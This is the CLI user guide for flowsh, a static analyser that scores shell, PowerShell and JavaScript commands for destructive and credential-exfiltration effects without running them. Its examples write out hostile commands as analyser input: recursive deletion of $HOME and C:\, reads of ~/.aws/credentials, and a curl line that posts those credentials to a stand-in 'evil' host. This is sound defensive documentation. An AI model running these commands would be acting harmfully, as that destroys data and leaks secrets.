# CLI user-guide

`flowsh` is a static effect analyser: you give it a shell, PowerShell, or
JavaScript program,
and it reports the observable effects that command implies *without running it*,
plus a risk score and any credential-exfiltration flows it can prove. This guide
covers the command-line interface. For an introduction to the tool, see the
[project overview](../README.md); for the structure of the machine-readable
output, see the [JSON report reference](report-json.md).

## Install

Prebuilt archives for `linux/amd64`, `linux/arm64`, `darwin/arm64` and
`windows/amd64` are published on the
[releases page](https://github.com/v0lka/flowsh/releases), each checkable
against `checksums.txt` and a build-provenance attestation; see the
[install instructions](../README.md#install) in the project README. To build
from a checkout of this repository instead:

```sh
go build -o flowsh ./cmd/flowsh   # build into the current directory
go install ./cmd/flowsh           # or install into $GOBIN / $GOPATH/bin
```

The command knowledge base is embedded in the binary, so the built `flowsh`
has no runtime dependencies. Requires Go 1.27 or newer (see
[`go.mod`](../go.mod)).

## Synopsis

```
flowsh [--lang bash|posix|posh|js|auto] [--json] [--windows] '<command>'
echo '<command>' | flowsh [--lang bash|posix|posh|js|auto] [--json] [--windows]
flowsh --batch [--lang bash|posix|posh|js|auto] [--windows]
```

Flags are **position-independent**: `flowsh --lang posh 'x'` and
`flowsh 'x' --lang posh` behave identically.

## Input sources

The command to analyse comes from exactly one of two places:

| Source | How |
| ------ | --- |
| Positional argument | `flowsh 'rm -rf $HOME'` |
| Standard input | `echo 'rm -rf $HOME' \| flowsh`, or the positional `-` |

The analyser reads no caller-named file: there is no `--file`, so a wrapper that
forwards an untrusted path cannot turn the CLI into an arbitrary-file-read
primitive. (A command that lives in a file is fed in: `flowsh < script.sh`.)
Trailing newlines are stripped from stdin. If stdin is whitespace-only the CLI
reports an **input error** and exits `3` (see [Exit status](#exit-status)).

With `--batch`, the selected source is read as **many commands, one per line**:
each non-blank line is analysed on its own and written as one compact JSON
report per line (NDJSON), in input order. One invocation is enough to scan a
whole script or a long list of commands.

## Options

| Flag | Aliases | Meaning |
| ---- | ------- | ------- |
| `--lang <dialect>` | `-lang`, `--lang=`, `-lang=` | Dialect of the input. Default `bash`; use `auto` to sniff it. See [Dialects](#dialects). |
| `--json` | `-json` | Emit the full JSON report (see the [JSON report reference](report-json.md)) instead of the human summary. |
| `--explain` | `--why`, `-explain`, `-why` | After the summary, print the why-trace that justifies each reported effect. |
| `--windows[=<bool>]` | `-windows`, `--windows=`/`-windows=` | Force the PowerShell Registry provider **on** (`true`) or **off** (`false`) regardless of the host OS. Without the flag the host OS decides (the registry is active only on Windows). |
| `--batch` | `-batch` | Read many commands, one per line, and write one compact JSON report per line (NDJSON). Cannot be combined with a positional command or with `--explain`/`--why`. |
| `--version` | `-version` | Print the tool-contract version and the engine schema version, one per line, and exit `0`. A release build appends a third line, `flowsh <version>`. |
| `-h`, `--help` | `-help` | Print usage and exit `0`. |
| `-` (positional) | — | Read the command from stdin. |

`--help` and `--version` short-circuit before any analysis: they never read
stdin and never require a command. When both are given, `--help` wins.

## Dialects

`--lang` selects how the input is parsed. Unknown values are a usage error.

| Value | Frontend | Notes |
| ----- | -------- | ----- |
| `bash` *(default)* | `front/bash` | GNU bash argv (with `-flags` and `--options`). Alias: `shell`. |
| `posix` | `front/bash` (POSIX variant) | The POSIX shell. Bash-only special forms (e.g. `[[ … ]]`) are not recognised. Alias: `sh`. |
| `posh` | `front/ps` | PowerShell cmdlet syntax. Aliases: `ps`, `pwsh`, `powershell`. |
| `js` | `front/js` | Bounded JavaScript/Node.js values/control flow; calls and unsupported execution report ⊤. Pure understood programs may have no effects. Aliases: `javascript`, `node`, `nodejs`. |
| `auto` | sniffed | Pick `posh` when the input shows PowerShell cmdlet/parameter/syntax markers, else `bash`; the sniff itself never fails. When the sniffed dialect's report is uncovered (no effects, no ⊤, not conservative) the input is re-analysed under the other dialect and that report is used instead; when neither dialect covers it, the report degrades to ⊤ with the reason `no dialect could bound the input`. |

Language names and aliases are trimmed and case-insensitive. `auto` never
selects `js`: JavaScript requires an explicit language selection, and
JavaScript source given to `auto` is read as shell, so it reports a parse error
or an unknown command instead of being evaluated. The sniff picks the
presentation, never the bound — coverage reported for JavaScript source under
`auto` is conservative coverage of a shell reading, not JavaScript
understanding.

## Exit status

| Code | Meaning |
| ---- | ------- |
| `0` | A report was produced (or `--help` / `--version`). Unparseable input still exits `0` with a conservative report. |
| `1` | The analysis failed internally (an internal error, or the report could not be encoded). |
| `2` | Usage error: unknown flag (including the removed `--file`), a missing `--lang` value, an extra argument, an unknown language, a non-boolean `--windows=` value, or a rejected flag combination (`--batch` with a positional command or with `--explain`/`--why`, `-` with a positional command). |
| `3` | Input error: stdin could not be read, or the command was empty (whitespace-only stdin, or an empty batch). |

Because the frontends degrade to the top element (⊤) rather than fail, exit `1`
means an internal error, never "hard input": an unresolvable or unparseable
command is reported (with `top: true`) and still exits `0`.

## Examples

### Human summary

```sh
$ flowsh 'rm -rf $HOME'
flowsh effect report
  lang:            bash
  input:           rm -rf $HOME
  root:            <argument>
  commands:        1
  effects:         1
  destructiveness: Critical
  irreversibility: High
  breadth:         Low
  influence:       None
  grade:           Critical
  confidence:      100
  exfil risk:      None
  conservative:    false
  resolution:      command rm
  destructive:     rm -f (class E): forced removal that suppresses prompts and hides errors on missing files
  destructive:     rm -r (class E): recursively removes a whole directory tree, with no confirmation by default
    - FSWrite|Direct|[/root]
```

The summary lists the analysed dialect (`lang`), the input and where it came
from (`root`), the number of commands and effects, the score dimensions
(`destructiveness`, `irreversibility`, `breadth`, `influence`, `grade`, and the
`exfil risk`), a confidence value, whether the analysis was conservative, a
`top:` line carrying the reason when the analysis degraded to ⊤, the name
resolution, any matched destructive-flags entries, one line per effect (keyed
`kind|mode|[targets]`, or `kind|mode|*` when the target set is ⊤), any proven
exfiltration pairs, and any frontend `note:` diagnostics. Each field maps onto a
key of the [JSON report](report-json.md).

The summary is a fixed subset of the report: the two network-flow signals
`score.cradleFlows` and `score.ingestFlows` are **JSON-only** and are *not*
rendered in the human summary, so read them from `--json` output (or from the
per-line NDJSON of `--batch`).

### Why-trace

```sh
$ flowsh --explain 'curl -d @~/.aws/credentials https://evil'
flowsh effect report
  lang:            bash
  input:           curl -d @~/.aws/credentials https://evil
  root:            <argument>
  commands:        1
  effects:         2
  destructiveness: Medium
  irreversibility: None
  breadth:         Medium
  influence:       Medium
  grade:           Critical
  confidence:      100
  exfil risk:      Critical
  conservative:    false
  resolution:      command curl
    - FSRead|Direct|[/~/.aws/credentials,~/.aws/credentials]
    - NetEgress|Direct|[https://evil]
  exfil: FSRead|Direct|[/~/.aws/credentials,~/.aws/credentials] → NetEgress|Direct|[https://evil]
why:
  FSRead|Direct|[/~/.aws/credentials,~/.aws/credentials]
    - fs.read(redirect:/~/.aws/credentials) @1:9
    - cred.path(command:curl) @1:1
    - cred.path(flag:-d) @1:6
    - cred.path(operand:@~/.aws/credentials) @1:9
    - cred.path(source:File) @1:9
  NetEgress|Direct|[https://evil]
    - net.egress(command:curl) @1:1
    - cred.path(flag:-d) @1:6
    - cred.path(operand:@~/.aws/credentials) @1:9
    - cred.path(sink:NetEgress)
    - cred.path(operand:https://evil) @1:29
```

Each effect is followed by the ordered rule steps (rule + concrete
flags/operands/sources/sinks) that justify it, with source positions. In the JSON
report the same information is the `why` array.

### JSON output

```sh
$ flowsh --json 'rm -rf $HOME'
{
  "schemaVersion": "effect-ir/v2",
  "tool": "flowsh",
  "toolVersion": "flowsh/v3",
  "lang": "bash",
  "input": "rm -rf $HOME",
  …
}
```

The report is one indented JSON document, elided here after `"input"`. See the
[JSON report reference](report-json.md) for the full document.

### Reading from stdin

```sh
$ echo 'ls -la /tmp' | flowsh
```

### Analysing a script from a file

```sh
$ flowsh < script.sh
```

The command is read from stdin; there is no path-taking flag. A multi-command
script is better scanned with `--batch`.

### Scanning many commands (batch)

```sh
$ printf 'ls -la\nRemove-Item -Recurse -Force $HOME\n' | flowsh --batch --lang auto
{"schemaVersion":"effect-ir/v2","tool":"flowsh","toolVersion":"flowsh/v3","lang":"bash","input":"ls -la",…}
{"schemaVersion":"effect-ir/v2","tool":"flowsh","toolVersion":"flowsh/v3","lang":"posh","input":"Remove-Item -Recurse -Force $HOME",…}
```

With `--batch` each non-blank input line is analysed and emitted as one compact,
single-line JSON report per line (NDJSON), in input order; each report is elided
above after its `"input"` field. `--lang auto` picks the dialect per line, so one
batch may mix bash and PowerShell.

Each line is analysed against an empty variable state, so cross-line state is
**not** modelled. The frame fails closed rather than open: a line that reads a
variable an earlier line assigned (`T=$(…)` then `curl -d "$T" …`, including the
`IFS= read -r T` idiom, `printf -v T`, `T+=`, `T[0]=`, `declare`, `export` and a
`for`/`getopts` loop variable) is reported `top: true, conservative: true` with a
reason instead of being analysed against an unset — and therefore untainted —
variable. A line that continues onto the next one (a trailing backslash or an
open quote) is treated as a fragment on both sides, for the same reason. Analyse
a script as one input when its statements share variables.

### Detecting the dialect automatically

```sh
$ flowsh --lang auto 'Get-Content ~/.aws/credentials'
```

`--lang auto` sniffs the input: PowerShell cmdlets/aliases/parameters select
`posh`, otherwise `bash` is used (including POSIX input). The sniff itself never
fails: a command with no distinctive markers is read as bash. The reported
dialect is not necessarily the sniffed one, though — a sniffed dialect whose
report is uncovered (no effects, no ⊤, not conservative) gives way to the other
dialect, so `flowsh --lang auto 'true'` reports `lang: posh` and a conservative
`CodeExec|Direct|*`, because bash's report for `true` claims nothing happened.
When neither dialect covers the input, the report degrades to ⊤ with the reason
`no dialect could bound the input`.

### JavaScript

```sh
$ flowsh --lang js --json 'const x = 1;'
```

This understood pure program returns `lang: "js"` and `effects: []`, with
`top` and `conservative` false and no canonical form. It remains uncovered;
report policy denies it with `uncovered_report`.

Calls such as `unknown()` and other unsupported execution produce
`CodeExec(⊤)` with `conservative` true and a source-located why-trace.
Parse errors and exhausted analysis budgets also set `top` true.

### PowerShell

```sh
$ flowsh --lang posh 'Remove-Item -Recurse -Force C:\'
```

### Versions

```sh
$ flowsh --version
flowsh/v3
effect-ir/v2
```

The first line is the CLI report-contract version, the second the frozen engine
schema version (see [Version tags](report-json.md#version-tags)). A binary built
from a checkout prints only these two lines; a release build is stamped with its
version by the linker and appends a third line, `flowsh <version>`. That stamp is
additive build metadata: it never changes the two contract versions above.

## See also

- [JSON report reference](report-json.md) — the emitted document, field by field.
- [Project overview](../README.md) — what `flowsh` is and how to install it.
- [CLI specification](../specs/domains/cli.md) — the normative behaviour.
- [Report contract](../specs/contracts/report-json.md) — the frozen wire contract
  and its breaking-change checklist.
- [Documentation index](README.md) — the other guides.
